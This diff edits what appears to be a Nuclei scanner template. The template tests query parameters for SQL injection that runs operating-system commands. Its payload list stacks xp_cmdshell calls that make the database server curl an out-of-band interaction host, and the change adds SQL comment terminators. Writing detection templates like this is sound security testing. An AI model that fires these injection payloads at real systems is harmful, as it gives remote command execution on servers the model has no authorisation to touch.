@@ -13,10 +13,11 @@ http:
       
     payloads:
       dirtree:
-        - "1; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'"
-        - "1' ; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'"
-        - "1" ; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'"
-	
+        - "1; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'--"
+        - "1'; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'--"
+        - "1\"; exec xp_cmdshell 'curl http://{{interactsh-url}}/abc'--"
+
+        
     fuzzing:
       - part: query
         mode: multiple
